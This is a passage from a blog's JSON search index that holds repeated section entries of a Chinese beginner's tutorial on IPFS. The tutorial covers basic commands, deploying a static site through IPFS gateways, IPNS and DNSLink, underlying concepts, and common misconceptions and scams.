","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:2:1","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#现有的网络是集中的限制了机会"},{"categories":["tutorial"],"content":"与现有Web比较 现有的网络技术效率低下、成本高昂 HTTP一次从一台计算机下载文件，而不是同时从多台计算机获取文件。点对点IPFS节省了大量的带宽，视频高达60%，这使得无需重复地高效地分发大量数据成为可能。 现有的网络无法保存人类的历史 一个网页的平均寿命是100天，然后就永远消失了。我们这个时代的主要媒介还不够脆弱。IPFS保留文件的每一个版本，并使为镜像数据建立弹性网络变得简单。 现有的网络是集中的，限制了机会 互联网作为人类历史上最伟大的均衡器之一，推动了创新的发展，但日益巩固的集权控制威胁着这一进步。IPFS通过分布式技术来避免这一点。 现有的网络深度依赖主干网 IPFS支持创建多样化的弹性网络，以实现持久可用性，无论是否有Internet主干网连接。这意味着发展中国家在自然灾害期间，或者在咖啡厅的wi-fi上时，能够更好地连接。 ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:2:1","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#现有的网络深度依赖主干网"},{"categories":["tutorial"],"content":"IPFS做的更好 IPFS宣称，无论你现在在用已有的Web技术干什么，IPFS都可以做到更好。 对于归档人员 IPFS提供了数据块去重、高性能和基于集群的数据持久化，这有利于存储世界上的信息来造福后代 对于服务提供商 IPFS提供安全的P2P内容交付，可以为服务提供者节省数百万带宽成本 对于研究者 如果您使用或分发大型数据集，IPFS可以帮助您提供快速的性能和分散的归档 对于世界发展 对于那些互联网基础设施较差的人来说，高延迟网络是一大障碍。IPFS提供对数据的弹性访问，独立于延迟或主干网连接 对于区块链 使用IPFS，您可以处理大量数据，并在事务中放置不可变的永久链接—时间戳和保护内容，而不必将数据本身放在链上 对于内容创造者 IPFS充分体现了网络的自由和独立精神，可以帮助您以更低的成本交付内容 ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:2:2","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#ipfs做的更好"},{"categories":["tutorial"],"content":"工作原理 让我们通过向IPFS添加一个文件这个过程，来简单看一下IPFS是如何工作的 IPFS将文件切割为多个小块，每个块的大小为256KB，块的数量由文件的大小决定。然后计算每个块的Hash，作为这个块的指纹。 因为很多文件数据有重复的部分，在切割成小块后，这些小块有的会完全相同，表现出来就是指纹Hash相同。拥有相同指纹Hash的块被视为同一个块，所以相同的数据在IPFS都表现为同一块，这也就消除了存储相同数据的额外开销。 IPFS网络中的每一个节点只存储自己感兴趣的内容，也就是该IPFS节点的使用者经常访问、或指定要固定的内容。 除此之外还需要额外存储一些索引信息，这些索引信息用来帮助文件查找的寻址工作。当我们需要获取某个块的时候，索引信息就可以告诉IPFS这个特定块在哪些节点上有存储。 当我们要从IPFS中查看或者下载某个文件时，IPFS便要通过改文件的指纹Hash查询索引信息，并向自己连接的节点进行询问。这一步需要找到IPFS网络中的哪些节点存储着自己想要的文件数据块。 如果你无法记住IPFS中存储的文件的指纹Hash(是一段非常长的字符串)，实际上你也无须记住这个Hash，IPFS提供了IPNS来提供人类可读名字到指纹Hash之间的映射，你只需要记住你添加在IPNS中的人类可读名字即可。 ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:3:0","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#工作原理"},{"categories":["tutorial"],"content":"基本使用 ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:4:0","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#基本使用"},{"categories":["tutorial"],"content":"安装 设置环境变量IPFS_PATH，这个目录在后面进行初始化和使用的时候会作为IPFS的本地仓库。如果这里不进行设置，IPFS默认会使用用户目录下的.ipfs文件夹作为本地仓库。 初始化 运行命令 ipfs init 进行初始化，这一步会初始化密钥对，并在刚刚指定的IPFS_PATH目录创建初始文件。 查看节点ID信息 运行命令 ipfs id 即可查看自己IPFS节点ID信息，包含了节点ID、公钥、地址、代理版本、协议版本、支持的协议等信息 可以通过 ipfs id 别人的ID来查看别人的节点ID信息 检查可用性 通过显示的命令来检查可用性，这里使用ipfs cat命令来查看指定的CID对应的内容。 开启守护进程 运行下面命令开启守护进程 ipfs daemon ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:4:1","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#安装"},{"categories":["tutorial"],"content":"安装 设置环境变量IPFS_PATH，这个目录在后面进行初始化和使用的时候会作为IPFS的本地仓库。如果这里不进行设置，IPFS默认会使用用户目录下的.ipfs文件夹作为本地仓库。 初始化 运行命令 ipfs init 进行初始化，这一步会初始化密钥对，并在刚刚指定的IPFS_PATH目录创建初始文件。 查看节点ID信息 运行命令 ipfs id 即可查看自己IPFS节点ID信息，包含了节点ID、公钥、地址、代理版本、协议版本、支持的协议等信息 可以通过 ipfs id 别人的ID来查看别人的节点ID信息 检查可用性 通过显示的命令来检查可用性，这里使用ipfs cat命令来查看指定的CID对应的内容。 开启守护进程 运行下面命令开启守护进程 ipfs daemon ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:4:1","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#初始化"},{"categories":["tutorial"],"content":"安装 设置环境变量IPFS_PATH，这个目录在后面进行初始化和使用的时候会作为IPFS的本地仓库。如果这里不进行设置，IPFS默认会使用用户目录下的.ipfs文件夹作为本地仓库。 初始化 运行命令 ipfs init 进行初始化，这一步会初始化密钥对，并在刚刚指定的IPFS_PATH目录创建初始文件。 查看节点ID信息 运行命令 ipfs id 即可查看自己IPFS节点ID信息，包含了节点ID、公钥、地址、代理版本、协议版本、支持的协议等信息 可以通过 ipfs id 别人的ID来查看别人的节点ID信息 检查可用性 通过显示的命令来检查可用性，这里使用ipfs cat命令来查看指定的CID对应的内容。 开启守护进程 运行下面命令开启守护进程 ipfs daemon ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:4:1","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#查看节点id信息"},{"categories":["tutorial"],"content":"安装 设置环境变量IPFS_PATH，这个目录在后面进行初始化和使用的时候会作为IPFS的本地仓库。如果这里不进行设置，IPFS默认会使用用户目录下的.ipfs文件夹作为本地仓库。 初始化 运行命令 ipfs init 进行初始化，这一步会初始化密钥对，并在刚刚指定的IPFS_PATH目录创建初始文件。 查看节点ID信息 运行命令 ipfs id 即可查看自己IPFS节点ID信息，包含了节点ID、公钥、地址、代理版本、协议版本、支持的协议等信息 可以通过 ipfs id 别人的ID来查看别人的节点ID信息 检查可用性 通过显示的命令来检查可用性，这里使用ipfs cat命令来查看指定的CID对应的内容。 开启守护进程 运行下面命令开启守护进程 ipfs daemon ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:4:1","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#检查可用性"},{"categories":["tutorial"],"content":"安装 设置环境变量IPFS_PATH，这个目录在后面进行初始化和使用的时候会作为IPFS的本地仓库。如果这里不进行设置，IPFS默认会使用用户目录下的.ipfs文件夹作为本地仓库。 初始化 运行命令 ipfs init 进行初始化，这一步会初始化密钥对，并在刚刚指定的IPFS_PATH目录创建初始文件。 查看节点ID信息 运行命令 ipfs id 即可查看自己IPFS节点ID信息，包含了节点ID、公钥、地址、代理版本、协议版本、支持的协议等信息 可以通过 ipfs id 别人的ID来查看别人的节点ID信息 检查可用性 通过显示的命令来检查可用性，这里使用ipfs cat命令来查看指定的CID对应的内容。 开启守护进程 运行下面命令开启守护进程 ipfs daemon ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:4:1","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#开启守护进程"},{"categories":["tutorial"],"content":"获取文件(夹) IPFS获取文件的方式是隐式的，我们可以通过查看、下载等命令，告诉IPFS你要去获取我想要的文件 查看文本 查看文本使用 ipfs cat命令来进行，就如前面检查可用性的使用一样 下载二进制 对于图片、视频等文件，无法使用cat命令来查看（cat出来是一堆乱码），此时我们可以使用ipfs get cid的方式来将文件下载到本地。不过这样直接下载文件名会是指定的CID，一个长字符串不具有识别性，我们可以重定向到指定的文件，ipfs get cid -o newname.png 列出目录 通过ipfs ls命令来列出一个目录 ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:4:2","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#获取文件夹"},{"categories":["tutorial"],"content":"获取文件(夹) IPFS获取文件的方式是隐式的，我们可以通过查看、下载等命令，告诉IPFS你要去获取我想要的文件 查看文本 查看文本使用 ipfs cat命令来进行，就如前面检查可用性的使用一样 下载二进制 对于图片、视频等文件，无法使用cat命令来查看（cat出来是一堆乱码），此时我们可以使用ipfs get cid的方式来将文件下载到本地。不过这样直接下载文件名会是指定的CID，一个长字符串不具有识别性，我们可以重定向到指定的文件，ipfs get cid -o newname.png 列出目录 通过ipfs ls命令来列出一个目录 ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:4:2","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#查看文本"},{"categories":["tutorial"],"content":"获取文件(夹) IPFS获取文件的方式是隐式的，我们可以通过查看、下载等命令，告诉IPFS你要去获取我想要的文件 查看文本 查看文本使用 ipfs cat命令来进行，就如前面检查可用性的使用一样 下载二进制 对于图片、视频等文件，无法使用cat命令来查看（cat出来是一堆乱码），此时我们可以使用ipfs get cid的方式来将文件下载到本地。不过这样直接下载文件名会是指定的CID，一个长字符串不具有识别性，我们可以重定向到指定的文件，ipfs get cid -o newname.png 列出目录 通过ipfs ls命令来列出一个目录 ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:4:2","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#下载二进制"},{"categories":["tutorial"],"content":"获取文件(夹) IPFS获取文件的方式是隐式的，我们可以通过查看、下载等命令，告诉IPFS你要去获取我想要的文件 查看文本 查看文本使用 ipfs cat命令来进行，就如前面检查可用性的使用一样 下载二进制 对于图片、视频等文件，无法使用cat命令来查看（cat出来是一堆乱码），此时我们可以使用ipfs get cid的方式来将文件下载到本地。不过这样直接下载文件名会是指定的CID，一个长字符串不具有识别性，我们可以重定向到指定的文件，ipfs get cid -o newname.png 列出目录 通过ipfs ls命令来列出一个目录 ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:4:2","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#列出目录"},{"categories":["tutorial"],"content":"添加文件(夹) 通过ipfs add 文件名命令来将文件添加到IPFS 如果需要添加文件夹，需要添加-r参数来使其递归处理 ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:4:3","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#添加文件夹"},{"categories":["tutorial"],"content":"相关概念 在进行深一步学习之前，先让我们来看一下关于IPFS几个不得不知道的概念，这些概念是IPFS的基础组成部分，对后续的使用至关重要 ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:5:0","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#相关概念"},{"categories":["tutorial"],"content":"Peer Peer是对等节点，因为IPFS是基于P2P技术实现的，所以没有服务器客户端这一说，每个人都同时是服务器和客户端，人人为我，我为人人。 ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:5:1","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#peer"},{"categories":["tutorial"],"content":"CID 内容标识符（CID）是一个用于指向IPFS中的内容的标签。它不指示内容存储在哪里，但它根据内容数据本身形成一种地址。无论它指向的内容有多大，CID都很短 详细内容见：IPFS官方文档：Content addressing and CIDs 在线的CID查看器：CID Inspector ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:5:2","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#cid"},{"categories":["tutorial"],"content":"Gateway IPFS官方提供的Gateway: https://ipfs.io/ Cloudflare提供的IPFS Gateway服务：https://cf-ipfs.com 其他公开的Gateway列表：https://ipfs.github.io/public-gateway-checker/ https://www.cloudflare.com/distributed-web-gateway/ 具体见：IPFS文档：Gateway ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:5:3","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#gateway"},{"categories":["tutorial"],"content":"IPNS IPFS使用基于内容的寻址方式，简单说就是IPFS根据文件数据的Hash来生成CID，这个CID只与文件内容有关，这也就导致了如果我们修改这个文件的内容，这个CID也会改变。如果我们通过IPFS给别人分享文件，则每次更新内容时都需要给此人一个新链接。 为了解决这个问题，星际名称系统（IPNS）通过创建一个可以更新的地址来解决这个问题。 具体见：IPFS文档：IPNS ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:5:4","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#ipns"},{"categories":["tutorial"],"content":"IPLD https://docs.ipfs.io/concepts/ipld/ ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:5:5","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#ipld"},{"categories":["tutorial"],"content":"在IPFS部署网站 既然IPFS宣称能够构建新一代分布式Web，那我们便想要把自己的网站部署到IPFS上去，一起体验一下去中心化、分布式的Web3.0技术 ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:6:0","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#在ipfs部署网站"},{"categories":["tutorial"],"content":"将文件添加到IPFS中 我使用的是Hugo静态网站生成器生成我的博客，生成的内容存放在public目录下，所以首先我需要将public目录及其里面的所有内容添加到IPFS中。 # -r 参数代表递归添加 ipfs add -r public # 实际运行效果 PS D:\\blog\u003e ipfs add -r public added QmZT5jXEi2HFVv8tzuDqULBaiEPc8geZFVjXxb9iAsBqbg public/404.html added QmcGDfkg6mcboba3MkNeamGQvRgdnHiD4HZhvCRwEnSdSj public/CNAME 很长的滚屏后...... added QmT61SS4ykbnt1ECQFDfX27QJdyhsVfRrLJztDvbcR7Kc1 public/tags added QmdoJ8BiuN8H7K68hJhk8ZrkFXjU8T9Wypi9xAyAzt2zoj public 35.12 MiB / 35.12 MiB [===========================================] 100.00% 如果你不想看这么长的滚屏，只想要最后一个Hash，可以添加一个 Q （quiet） 参数 PS D:\\blog\\blog\u003e ipfs add -rQ public QmdoJ8BiuN8H7K68hJhk8ZrkFXjU8T9Wypi9xAyAzt2zoj ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:6:1","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#将文件添加到ipfs中"},{"categories":["tutorial"],"content":"通过IPFS网关访问 在刚刚添加完成的最后，名称为public的那串Hash便是public目录的CID，我们现在可以通过这个CID在IPFS网关上访问我们刚刚的添加的内容。 本机网关访问 我们先通过本机的IPFS网关来访问一下，看看有没有添加成功。注意这一步需要你本地已经开启了IPFS守护进程。 访问：http://localhost:8080/ipfs/QmdoJ8BiuN8H7K68hJhk8ZrkFXjU8T9Wypi9xAyAzt2zoj 然后浏览器会自动进行跳转，可以看到能够正常访问我们的页面 注意 你会发现浏览器地址栏的网址为一个另一个长字符串构成的域名 长字符串.ipfs.localhost:8080 这里的长字符串是IPFS中的另一个概念：IPLD 如果你的页面只能够显示内容，但是样式是错误的，如下图 这是因为使用的是绝对地址，我们需要使用相对地址的形式，如果你和我一样使用Hugo，那么只需要在你的配置文件中增加 relativeURLs = true 即可 远程网关访问 刚刚我们通过本机的IPFS网关成功访问到了IPFS中的网站，现在我们找一个公开的其他的IPFS网关来访问试一下 这里我选择IPFS官方维护的网关：https://ipfs.io，访问：https://ipfs.io/ipfs/QmdoJ8BiuN8H7K68hJhk8ZrkFXjU8T9Wypi9xAyAzt2zoj 需要注意的是，此时网站还只存在于我们本机上，其他IPFS网关从IPFS网络中找到我们的网站文件需要一段时间，我们需要保证此时IPFS守护进程不关闭并已经连接了成百上千的其他节点，这样有利于IPFS官方Gateway尽快找到我们。 经过多次刷新和焦急的等待后，终于有了显示 ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:6:2","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#通过ipfs网关访问"},{"categories":["tutorial"],"content":"通过IPFS网关访问 在刚刚添加完成的最后，名称为public的那串Hash便是public目录的CID，我们现在可以通过这个CID在IPFS网关上访问我们刚刚的添加的内容。 本机网关访问 我们先通过本机的IPFS网关来访问一下，看看有没有添加成功。注意这一步需要你本地已经开启了IPFS守护进程。 访问：http://localhost:8080/ipfs/QmdoJ8BiuN8H7K68hJhk8ZrkFXjU8T9Wypi9xAyAzt2zoj 然后浏览器会自动进行跳转，可以看到能够正常访问我们的页面 注意 你会发现浏览器地址栏的网址为一个另一个长字符串构成的域名 长字符串.ipfs.localhost:8080 这里的长字符串是IPFS中的另一个概念：IPLD 如果你的页面只能够显示内容，但是样式是错误的，如下图 这是因为使用的是绝对地址，我们需要使用相对地址的形式，如果你和我一样使用Hugo，那么只需要在你的配置文件中增加 relativeURLs = true 即可 远程网关访问 刚刚我们通过本机的IPFS网关成功访问到了IPFS中的网站，现在我们找一个公开的其他的IPFS网关来访问试一下 这里我选择IPFS官方维护的网关：https://ipfs.io，访问：https://ipfs.io/ipfs/QmdoJ8BiuN8H7K68hJhk8ZrkFXjU8T9Wypi9xAyAzt2zoj 需要注意的是，此时网站还只存在于我们本机上，其他IPFS网关从IPFS网络中找到我们的网站文件需要一段时间，我们需要保证此时IPFS守护进程不关闭并已经连接了成百上千的其他节点，这样有利于IPFS官方Gateway尽快找到我们。 经过多次刷新和焦急的等待后，终于有了显示 ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:6:2","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#本机网关访问"},{"categories":["tutorial"],"content":"通过IPFS网关访问 在刚刚添加完成的最后，名称为public的那串Hash便是public目录的CID，我们现在可以通过这个CID在IPFS网关上访问我们刚刚的添加的内容。 本机网关访问 我们先通过本机的IPFS网关来访问一下，看看有没有添加成功。注意这一步需要你本地已经开启了IPFS守护进程。 访问：http://localhost:8080/ipfs/QmdoJ8BiuN8H7K68hJhk8ZrkFXjU8T9Wypi9xAyAzt2zoj 然后浏览器会自动进行跳转，可以看到能够正常访问我们的页面 注意 你会发现浏览器地址栏的网址为一个另一个长字符串构成的域名 长字符串.ipfs.localhost:8080 这里的长字符串是IPFS中的另一个概念：IPLD 如果你的页面只能够显示内容，但是样式是错误的，如下图 这是因为使用的是绝对地址，我们需要使用相对地址的形式，如果你和我一样使用Hugo，那么只需要在你的配置文件中增加 relativeURLs = true 即可 远程网关访问 刚刚我们通过本机的IPFS网关成功访问到了IPFS中的网站，现在我们找一个公开的其他的IPFS网关来访问试一下 这里我选择IPFS官方维护的网关：https://ipfs.io，访问：https://ipfs.io/ipfs/QmdoJ8BiuN8H7K68hJhk8ZrkFXjU8T9Wypi9xAyAzt2zoj 需要注意的是，此时网站还只存在于我们本机上，其他IPFS网关从IPFS网络中找到我们的网站文件需要一段时间，我们需要保证此时IPFS守护进程不关闭并已经连接了成百上千的其他节点，这样有利于IPFS官方Gateway尽快找到我们。 经过多次刷新和焦急的等待后，终于有了显示 ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:6:2","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#远程网关访问"},{"categories":["tutorial"],"content":"使用IPNS进行映射 使用命令 ipfs name publish CID 来发布一个IPNS，这里可能需要等待一会 PS D:\\blog\\blog\u003e ipfs name publish QmdoJ8BiuN8H7K68hJhk8ZrkFXjU8T9Wypi9xAyAzt2zoj Published to k51qzi5uqu5djhbknypxifn09wxhtf3y1bce8oriud1ojqz5r71mpu75rru520: /ipfs/QmdoJ8BiuN8H7K68hJhk8ZrkFXjU8T9Wypi9xAyAzt2zoj 通过使用IPNS映射，后续我们可以不断更新网站内容。如果没有使用IPNS而是直接发布CID，那别人便无法访问最新的版本了 注意 如果使用了IPNS，需要备份节点的私钥和生成IPNS地址时生成的Key 它们分别存储在你init时显示的目录下的config文件和keystore文件夹内 ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:6:3","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#使用ipns进行映射"},{"categories":["tutorial"],"content":"解析域名 IPNS不是在IPFS上创建可变地址的唯一方法，我们还可以使用DNSLink，它目前比IPNS快得多，还使用人类可读的名称。 例如我想要给刚刚发布在IPFS上的网站绑定ipfs.zu1k.com这个域名，那我就需要创建_dnslink.ipfs.zu1k.com的TXT记录 然后任何人都可以用 /ipfs/ipfs.zu1k.com 来找到我的网站了，访问http://localhost:8080/ipns/ipfs.zu1k.com 详细文档见：IPFS文档：DNSLink ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:6:4","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#解析域名"},{"categories":["tutorial"],"content":"更新内容 更新内容时，只需要再添加一次，然后重新发布IPNS，如果你是使用DNSLink的方式，还需要修改DNS记录 ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:6:5","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#更新内容"},{"categories":["tutorial"],"content":"底层技术 ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:7:0","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#底层技术"},{"categories":["tutorial"],"content":"Merkle有向无环图（DAG） 每个Merkle都是一个有向无环图 ，因为每个节点都通过其名称访问。每个Merkle分支都是其本地内容的哈希，它们的子节点使用它们的哈希而非完整内容来命名。因此，在创建后将不能编辑节点。这可以防止循环（假设没有哈希碰撞），因为无法将第一个创建的节点链接到最后一个节点从而创建最后一个引用。 对任何Merkle来说，要创建一个新的分支或验证现有分支，通常需要在本地内容的某些组合体（例如列表的子哈希和其他字节）上使用一种哈希算法。IPFS中有多种散列算法可用。 输入到散列算法中的数据的描述见 https://github.com/ipfs/go-ipfs/tree/master/merkledag 具体见：IPFS文档：Merkle ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:7:1","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#merkle有向无环图dag"},{"categories":["tutorial"],"content":"分布式散列表DHT 具体见：IPFS文档：DHT ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:7:2","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#分布式散列表dht"},{"categories":["tutorial"],"content":"上层应用 IPFS作为一个文件系统，本质就是用来存储文件，基于这个文件系统的一些特性，有很多上层应用涌现出来。 ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:8:0","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#上层应用"},{"categories":["tutorial"],"content":"Filecoin ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:9:0","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#filecoin"},{"categories":["tutorial"],"content":"基于IPFS构建应用 IPFS提供了IPFS协议的Golang和JavaScript实现，可以非常方便的将IPFS集成到我们的应用当中，充分利用IPFS的各种优势。 ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:10:0","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#基于ipfs构建应用"},{"categories":["tutorial"],"content":"未来的期望 对于P2P：https://t.zu1k.com/post/618818179793371136/%E5%85%B3%E4%BA%8Eresilio-sync ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:11:0","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#未来的期望"},{"categories":["tutorial"],"content":"一些问题 ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:12:0","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#一些问题"},{"categories":["tutorial"],"content":"IPFS可以永久存储文件？ 很多人误认为IPFS可以永久存储文件，从使用的技术来讲的确更有利于永久存储内容，但是还需不断需要有人访问、Pin、传播该内容，否则待全网所有节点都将该内容数据GC掉，数据还是会丢失。 ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:12:1","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#ipfs可以永久存储文件"},{"categories":["tutorial"],"content":"IPFS是匿名的？ 有人认为P2P就是匿名的，就像Tor一样，就像以太坊一样。实际上绝大部分P2P应用都不是匿名的，IPFS也不是匿名的，所以当你在发布敏感信息的时候，需要保护好自己。IPFS目前还不支持Tor网络。 ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:12:2","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#ipfs是匿名的"},{"categories":["tutorial"],"content":"IPFS速度快，延迟低？ 从理论上来讲，只要节点数量足够多，基于P2P技术的IPFS速度能够跑满你的带宽，延迟也有可能比中心化的Web低。但实际上，就目前情况而言，使用IPFS的人并不多，你链接的IPFS节点最多也就1000个左右（至少目前阶段我最多也就撑死连1000个以内），所以并不能达到理论的理想状态，所以现在IPFS的速度并不是很快，并且很少人访问的冷数据延迟很高，还有大概率找不到。 ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:12:3","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#ipfs速度快延迟低"},{"categories":["tutorial"],"content":"IPFS是骗局，Filecoin是骗局？ 的确，目前有很多投机的人，他们想要通过销售所谓的IPFS矿机（其实就是普通的电脑接上大硬盘）来盈利，所以他们故意去混淆IPFS、Filecoin、比特币、区块链等概念，打着永久存储的伪概念，用区块链这个热点来欺骗啥都不懂的老人，这种行为非常无耻。 实际上，IPFS本身并不是骗局，基于IPFS产生的激励层Filecoin也不是骗局，从我的使用来看，任何人都无需特意去购买任何所谓的IPFS矿机，只需要在自己的电脑运行时，后台跑一个IPFS守护进程就可以了。不要被所谓的币冲昏了头脑。 ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:12:4","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#ipfs是骗局filecoin是骗局"},{"categories":["tutorial"],"content":"参考资料 IPFS官网 IPFS文档 IPFS博客 维基百科：星际文件系统 将博客部署到星际文件系统（IPFS） ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:13:0","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#参考资料"},{"categories":["tutorial"],"content":"资源分享 